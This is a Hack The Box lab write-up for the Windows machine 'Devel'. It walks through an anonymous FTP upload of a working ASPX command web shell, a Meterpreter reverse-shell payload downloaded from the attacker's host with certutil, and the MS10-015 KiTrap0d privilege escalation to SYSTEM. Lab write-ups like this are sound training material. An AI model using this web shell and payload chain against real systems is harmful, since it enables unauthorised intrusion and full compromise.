# 📄 devel.md (Final Clean Version)

````markdown
# HTB - Devel

## 📌 Machine Information

- Name: Devel
- Difficulty: Easy
- Operating System: Windows

---

# 🔎 Enumeration

## Nmap Scan

```bash
nmap -p- -sV -sC -T4 -oN nmap.txt <TARGET>
````

### Results

* 21/tcp — Microsoft FTP
* 80/tcp — Microsoft IIS 7.5
* Anonymous FTP login allowed

### Key Observations

* FTP root maps directly to the IIS webroot.
* Anonymous FTP has write permissions.
* IIS 7.5 supports ASP.NET.

This indicates a strong possibility of uploading and executing an ASPX web shell.

---

# 🚪 Initial Access

## 1️⃣ Anonymous FTP Access

Connect:

```bash
ftp <TARGET>
```

Login:

```
anonymous
```

Upload ASPX command shell:

```bash
put cmd.aspx
```

---

## 2️⃣ ASPX Command Shell

Simple ASPX command execution shell:

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    if (cmd != null)
    {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();
        string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
}
</script>
```

Test execution:

```
http://<TARGET>/cmd.aspx?cmd=whoami
```

Returned:

```
iis apppool\web
```

---

# 🐚 Gaining Meterpreter Access

Generate payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER> LPORT=<PORT> -f exe -o meter.exe
```

Host payload:

```bash
python3 -m http.server 8000
```

Download via command shell:

```
cmd.aspx?cmd=certutil -urlcache -split -f http://<ATTACKER>:8000/meter.exe C:\Windows\Temp\meter.exe
```

Execute payload:

```
cmd.aspx?cmd=C:\Windows\Temp\meter.exe
```

---

## Catch the Session

Inside Metasploit:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ATTACKER>
set LPORT <PORT>
run
```

Meterpreter session successfully opened.

---

# ⬆️ Privilege Escalation

## System Enumeration

Inside Meterpreter:

```
sysinfo
```

Output indicated:

* Windows 7
* Version 6.1.7600
* x86 architecture

This version is vulnerable to **MS10-015 (KiTrap0d)**.

---

## Exploiting MS10-015

Background the session:

```
background
```

Load exploit module:

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST <ATTACKER>
set LPORT <NEW_PORT>
run
```

A new elevated session is opened.

Interact:

```
sessions -i 2
getuid
```

Result:

```
NT AUTHORITY\SYSTEM
```

---

# 🏁 Post Exploitation

User flag:

```
C:\Users\babis\Desktop\user.txt.txt
```

Root flag:

```
C:\Users\Administrator\Desktop\root.txt.txt
```

---

# 🔐 Attack Chain Summary

1. Anonymous FTP write access
2. ASPX command shell upload
3. Meterpreter reverse shell
4. MS10-015 (KiTrap0d) exploitation
5. SYSTEM compromise
